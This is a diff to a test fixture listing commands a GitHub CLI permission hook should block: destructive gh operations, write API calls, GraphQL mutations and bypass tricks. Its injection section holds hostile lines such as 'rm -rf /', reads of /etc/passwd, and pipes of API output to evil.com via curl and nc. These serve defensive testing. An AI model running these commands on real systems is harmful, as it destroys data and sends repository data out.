@@ -1,106 +1,338 @@
 # Commands that should be BLOCKED by the gh-permission-hook
 # Format: one command per line, lines starting with # are comments
 
+# =============================================================================
+# DESTRUCTIVE GH COMMANDS
+# =============================================================================
+
 # Repository destructive operations
 gh repo delete owner/repo
+gh repo delete owner/repo --yes
 gh repo create new-repo
+gh repo create new-repo --public
 gh repo edit --description "test"
+gh repo edit owner/repo --visibility private
 gh repo rename new-name
 gh repo archive
+gh repo archive owner/repo
 
-# Issue destructive operations (delete/transfer/pin are blocked, but create/edit/close are allowed)
+# Issue destructive operations (delete/transfer/pin are blocked)
 gh issue delete 123
+gh issue delete 123 --yes
 gh issue transfer 123 other-repo
 gh issue pin 123
 gh issue unpin 123
 
 # Release destructive operations
 gh release delete v1.0.0
+gh release delete v1.0.0 --yes
 gh release create v2.0.0
+gh release create v2.0.0 --title "Release" --notes "Notes"
 gh release edit v1.0.0
+gh release edit v1.0.0 --draft
 
 # Gist destructive operations
 gh gist delete abc123
 gh gist create test.txt
+gh gist create file1.txt file2.txt
 gh gist edit abc123
 
 # Workflow destructive operations
 gh run cancel 789
 gh run rerun 789
+gh run rerun 789 --failed
 gh workflow disable test.yml
+gh workflow enable test.yml
 
 # Auth operations
 gh auth logout
+gh auth logout --hostname github.example.com
 
 # Config write operations
 gh config set editor vim
+gh config set git_protocol ssh
+gh config set browser firefox
 
 # Label operations
 gh label create test-label
+gh label create bug --color ff0000
 gh label edit test-label
+gh label edit test-label --name new-name
 gh label delete test-label
+gh label delete test-label --yes
 
 # Secret and variable management
 gh secret set MY_SECRET
+gh secret set MY_SECRET --body "value"
 gh secret delete MY_SECRET
+gh secret list
 gh variable set MY_VAR
+gh variable set MY_VAR --body "value"
 gh variable delete MY_VAR
 
-# Destructive gh api commands
+# =============================================================================
+# GH API - DESTRUCTIVE HTTP METHODS
+# =============================================================================
+
+# POST method - various syntaxes
 gh api --method POST /repos/owner/repo/issues
 gh api --method=POST /repos/owner/repo/issues
-gh api --method DELETE /repos/owner/repo
-gh api --method=DELETE /repos/owner/repo
+gh api --method POST /repos/owner/repo/pulls
+gh api --method POST /repos/owner/repo/releases
+gh api --method POST /repos/owner/repo/forks
+gh api --method POST /repos/owner/repo/hooks
+gh api --method POST /repos/owner/repo/keys
+gh api --method POST /repos/owner/repo/labels
+gh api --method POST /user/repos
+gh api --method post /repos/owner/repo/issues
+gh api --method Post /repos/owner/repo/issues
+
+# POST with -X shorthand
 gh api -X POST /repos/owner/repo/issues
 gh api -X=POST /repos/owner/repo/issues
+gh api -X POST /repos/owner/repo/pulls
+gh api -X POST /repos/owner/repo/comments
+gh api -X post /repos/owner/repo/issues
+
+# DELETE method
+gh api --method DELETE /repos/owner/repo
+gh api --method=DELETE /repos/owner/repo
+gh api --method DELETE /repos/owner/repo/issues/123
+gh api --method DELETE /repos/owner/repo/pulls/123/comments/456
+gh api --method DELETE /repos/owner/repo/hooks/789
+gh api --method DELETE /repos/owner/repo/keys/101
+gh api --method delete /repos/owner/repo
+
+# DELETE with -X shorthand
 gh api -X DELETE /repos/owner/repo
 gh api -X=DELETE /repos/owner/repo
+gh api -X DELETE /repos/owner/repo/issues/123
+gh api -X DELETE /gists/abc123
+gh api -X delete /repos/owner/repo
+
+# PUT method
 gh api -X PUT /repos/owner/repo
+gh api -X=PUT /repos/owner/repo
+gh api --method PUT /repos/owner/repo
+gh api --method=PUT /repos/owner/repo
+gh api -X PUT /repos/owner/repo/contents/file.txt
+gh api -X PUT /repos/owner/repo/branches/main/protection
+gh api -X put /repos/owner/repo
+
+# PATCH method
 gh api -X PATCH /repos/owner/repo
+gh api -X=PATCH /repos/owner/repo
+gh api --method PATCH /repos/owner/repo
+gh api --method=PATCH /repos/owner/repo
+gh api -X PATCH /repos/owner/repo/issues/123
+gh api -X PATCH /repos/owner/repo/pulls/456
+gh api -X PATCH /user
+gh api -X patch /repos/owner/repo
+
+# =============================================================================
+# GH API - INPUT FLAGS (write operations to non-allowed endpoints)
+# =============================================================================
+
+# --input flag
 gh api --input data.json /repos/owner/repo/issues
 gh api --input=data.json /repos/owner/repo/issues
+gh api --input payload.json /repos/owner/repo/pulls
+gh api /repos/owner/repo/releases --input release.json
+
+# -f flag (field) to non-allowed endpoints
 gh api -f title=test /repos/owner/repo/issues
-gh api -f=title /repos/owner/repo/issues
+gh api -f=title=test /repos/owner/repo/issues
+gh api -f title="New Issue" /repos/owner/repo/issues
+gh api -f body="Description" /repos/owner/repo/issues
+gh api -f title=test -f body=desc /repos/owner/repo/issues
+gh api /repos/owner/repo/hooks -f url=http://example.com
+gh api /repos/owner/repo/labels -f name=bug -f color=ff0000
+
+# --field flag to non-allowed endpoints
 gh api --field title=test /repos/owner/repo/issues
-gh api --field=title /repos/owner/repo/issues
+gh api --field=title=test /repos/owner/repo/issues
+gh api --field title="Test" --field body="Body" /repos/owner/repo/pulls
+
+# -F flag (form field) to non-allowed endpoints
 gh api -F file=@data.json /repos/owner/repo/issues
-gh api -F=file /repos/owner/repo/issues
+gh api -F=file=@data.json /repos/owner/repo/issues
+gh api -F name=test /repos/owner/repo/releases
+gh api /repos/owner/repo/contents/file.txt -F content=base64data
 
-# GraphQL mutations (write operations) - note: resolveReviewThread is now allowed
+# Mixed flags to non-allowed endpoints
+gh api -f title=test --field body=desc /repos/owner/repo/issues
+gh api --input data.json -f extra=field /repos/owner/repo/pulls
+
+# =============================================================================
+# GH API GRAPHQL - BLOCKED MUTATIONS
+# =============================================================================
+
+# Issue mutations
 gh api graphql -f query="mutation { createIssue(input: {repositoryId: \"123\", title: \"test\"}) { issue { id } } }"
-gh api graphql -f query='mutation { addComment(input: {subjectId: "123", body: "test"}) { commentEdge { node { id } } } }'
+gh api graphql -f query='mutation { createIssue(input: {repositoryId: "123", title: "test"}) { issue { id } } }'
+gh api graphql -f query="mutation { updateIssue(input: {id: \"123\", title: \"new\"}) { issue { id } } }"
 gh api graphql -f query="mutation { deleteIssue(input: {issueId: \"123\"}) { repository { id } } }"
+gh api graphql -f query="mutation { closeIssue(input: {issueId: \"123\"}) { issue { state } } }"
+gh api graphql -f query="mutation { reopenIssue(input: {issueId: \"123\"}) { issue { state } } }"
 
-# Shell injection attempts (should be blocked even if command looks safe)
+# Comment mutations (not the allowed PR reply ones)
+gh api graphql -f query='mutation { addComment(input: {subjectId: "123", body: "test"}) { commentEdge { node { id } } } }'
+gh api graphql -f query="mutation { updateIssueComment(input: {id: \"123\", body: \"updated\"}) { issueComment { id } } }"
+gh api graphql -f query="mutation { deleteIssueComment(input: {id: \"123\"}) { clientMutationId } }"
+
+# PR mutations (not the allowed review ones)
+gh api graphql -f query="mutation { createPullRequest(input: {repositoryId: \"123\", title: \"PR\", baseRefName: \"main\", headRefName: \"feature\"}) { pullRequest { id } } }"
+gh api graphql -f query="mutation { updatePullRequest(input: {pullRequestId: \"123\", title: \"new\"}) { pullRequest { id } } }"
+gh api graphql -f query="mutation { closePullRequest(input: {pullRequestId: \"123\"}) { pullRequest { state } } }"
+gh api graphql -f query="mutation { mergePullRequest(input: {pullRequestId: \"123\"}) { pullRequest { merged } } }"
+
+# Repository mutations
+gh api graphql -f query="mutation { createRepository(input: {name: \"test\", visibility: PUBLIC}) { repository { id } } }"
+gh api graphql -f query="mutation { updateRepository(input: {repositoryId: \"123\", description: \"new\"}) { repository { id } } }"
+gh api graphql -f query="mutation { deleteRepository(input: {repositoryId: \"123\"}) { clientMutationId } }"
+
+# Branch/ref mutations
+gh api graphql -f query="mutation { createRef(input: {repositoryId: \"123\", name: \"refs/heads/new\", oid: \"abc\"}) { ref { id } } }"
+gh api graphql -f query="mutation { deleteRef(input: {refId: \"123\"}) { clientMutationId } }"
+
+# Label mutations
+gh api graphql -f query="mutation { createLabel(input: {repositoryId: \"123\", name: \"bug\", color: \"ff0000\"}) { label { id } } }"
+gh api graphql -f query="mutation { updateLabel(input: {id: \"123\", name: \"new\"}) { label { id } } }"
+gh api graphql -f query="mutation { deleteLabel(input: {id: \"123\"}) { clientMutationId } }"
+
+# User/org mutations
+gh api graphql -f query="mutation { followUser(input: {userId: \"123\"}) { user { login } } }"
+gh api graphql -f query="mutation { unfollowUser(input: {userId: \"123\"}) { user { login } } }"
+
+# Star mutations
+gh api graphql -f query="mutation { addStar(input: {starrableId: \"123\"}) { starrable { id } } }"
+gh api graphql -f query="mutation { removeStar(input: {starrableId: \"123\"}) { starrable { id } } }"
+
+# Reaction mutations
+gh api graphql -f query="mutation { addReaction(input: {subjectId: \"123\", content: THUMBS_UP}) { reaction { id } } }"
+gh api graphql -f query="mutation { removeReaction(input: {subjectId: \"123\", content: THUMBS_UP}) { reaction { id } } }"
+
+# Generic mutations with different syntax
+gh api graphql -f query='mutation CreateThing { createThing(input: {}) { thing { id } } }'
+gh api graphql -f query="mutation($input: CreateInput!) { create(input: \$input) { id } }"
+gh api graphql --field query='mutation { deleteThing(id: "123") { success } }'
+
+# =============================================================================
+# SHELL INJECTION ATTEMPTS
+# =============================================================================
+
+# Command separator (;)
 gh pr view 123; rm -rf /
-gh pr view 123 && rm -rf /
-gh pr view 123 || rm -rf /
-gh pr view 123 | cat /etc/passwd
-gh pr view $(whoami)
-gh pr view `whoami`
-gh pr view 123 & background_cmd
-gh pr view 123&malicious
-gh issue list; malicious_command
+gh pr view 123;rm -rf /
 gh api /repos/owner/repo; curl evil.com
+gh api /repos/owner/repo;curl evil.com
+gh issue list; malicious_command
 
-# Trailing background operator (should be blocked to prevent background execution)
+# Logical AND (&&)
+gh pr view 123 && rm -rf /
+gh pr view 123&& rm -rf /
+gh pr view 123 &&rm -rf /
+gh api /repos/owner/repo && curl evil.com
+
+# Logical OR (||)
+gh pr view 123 || rm -rf /
+gh pr view 123|| rm -rf /
+gh pr view 123 ||rm -rf /
+gh api /repos/owner/repo || curl evil.com
+
+# Pipe to malicious commands (not jq)
+gh pr view 123 | cat /etc/passwd
+gh pr view 123 | sh
+gh pr view 123 | bash
+gh pr view 123 | sh -c "malicious"
+gh api /repos/owner/repo | curl -d @- evil.com
+gh api /repos/owner/repo | nc evil.com 1234
+gh pr view 123 |cat /etc/passwd
+gh pr view 123| cat /etc/passwd
+
+# Background operator with command chaining
+gh pr view 123 & background_cmd
+gh pr view 123& malicious
+gh pr view 123 &malicious
+gh pr view 123&malicious
+gh api /repos/owner/repo & curl evil.com
+
+# Trailing background operator
 gh pr view 123 &
 gh pr view 123&
 gh issue list &
+gh api /repos/owner/repo &
+gh api graphql -f query='query { viewer { login } }' &
 
-# Env var prefix with destructive command (gh command should be extracted and blocked)
-GH_TOKEN=xxx gh repo delete owner/repo
-GH_TOKEN=secret gh api --method DELETE /repos/owner/repo
-
-# Command substitution in double quotes (must be blocked - double quotes don't prevent execution)
+# Command substitution with $(...)
+gh pr view $(whoami)
+gh pr view $(rm -rf /)
 gh pr view "$(whoami)"
 gh pr view "$(rm -rf /)"
+gh api /repos/$(whoami)/repo
 gh api /repos/owner/repo "$(malicious)"
-gh pr view "`whoami`"
+gh api graphql -f query="query { viewer { login $(malicious) } }"
 
-# Wrapper commands with destructive gh operations (should be blocked)
+# Command substitution with backticks
+gh pr view `whoami`
+gh pr view `rm -rf /`
+gh pr view "`whoami`"
+gh api /repos/`whoami`/repo
+gh api graphql -f query="query { viewer { login `id` } }"
+
+# Note: Newline injection cannot be tested via file-based tests since each line
+# is read as a separate command. The hook does block \n and \r characters.
+
+# =============================================================================
+# ENV VAR PREFIX WITH DESTRUCTIVE COMMANDS
+# =============================================================================
+
+GH_TOKEN=xxx gh repo delete owner/repo
+GH_TOKEN=secret gh api --method DELETE /repos/owner/repo
+GH_TOKEN=xxx gh api -X POST /repos/owner/repo/issues
+env GH_TOKEN=xxx gh repo delete owner/repo
+env GH_TOKEN=xxx gh api --method DELETE /repos/owner/repo
+GITHUB_TOKEN=xxx gh api -X DELETE /repos/owner/repo
+
+# =============================================================================
+# WRAPPER COMMANDS WITH DESTRUCTIVE GH OPERATIONS
+# =============================================================================
+
 sudo gh repo delete owner/repo
-command gh repo delete owner/repo
-sudo env GH_TOKEN=xxx gh repo delete owner/repo
 sudo gh issue delete 123
+sudo gh api --method DELETE /repos/owner/repo
+sudo gh api -X POST /repos/owner/repo/issues
+command gh repo delete owner/repo
+command gh api --method DELETE /repos/owner/repo
 env gh issue delete 123
+env gh api -X DELETE /repos/owner/repo
+sudo env GH_TOKEN=xxx gh repo delete owner/repo
+sudo env GH_TOKEN=xxx gh api --method DELETE /repos/owner/repo
+
+# =============================================================================
+# EDGE CASES AND BYPASS ATTEMPTS
+# =============================================================================
+
+# Trying to hide destructive method in noise
+gh api /repos/owner/repo --jq '.name' --method DELETE
+gh api --jq '.name' --method DELETE /repos/owner/repo
+gh api --paginate --method POST /repos/owner/repo/issues
+
+# Case variations (should still be blocked)
+gh api --method POST /repos/owner/repo/issues
+gh api --method post /repos/owner/repo/issues
+gh api --method Post /repos/owner/repo/issues
+gh api --method POST /repos/owner/repo/issues
+gh api -X DELETE /repos/owner/repo
+gh api -X delete /repos/owner/repo
+gh api -X Delete /repos/owner/repo
+
+# Spaces in flag values
+gh api --method  POST /repos/owner/repo/issues
+gh api -X  DELETE /repos/owner/repo
+
+# Input to repos endpoint (not pulls/comments/replies or issues/comments)
+gh api repos/owner/repo/comments -f body='comment'
+gh api repos/owner/repo/pulls/123/reviews -f body='review' -f event='APPROVE'
+gh api /repos/owner/repo/deployments -f ref='main' -f environment='production'
+gh api /repos/owner/repo/statuses/sha -f state='success'
